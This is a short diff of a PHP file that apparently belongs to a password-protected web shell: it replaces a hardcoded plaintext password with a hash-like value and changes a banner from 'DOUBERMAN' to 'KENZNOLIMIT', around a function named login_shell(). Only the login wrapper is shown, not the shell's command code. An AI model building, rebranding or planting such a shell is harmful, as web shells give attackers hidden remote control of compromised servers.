@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = "d0ub3rm4n";
+$password = "20b9b167a2180fef500e0d36e68439f6";
 
 function login_shell()
 {
@@ -211,7 +211,7 @@ input[type="submit"]:active
 
     <div class="content"> 
 
-     <h2>DOUBERMAN</h2> 
+     <h2>KENZNOLIMIT</h2> 
 
      <div class="form"> 
 
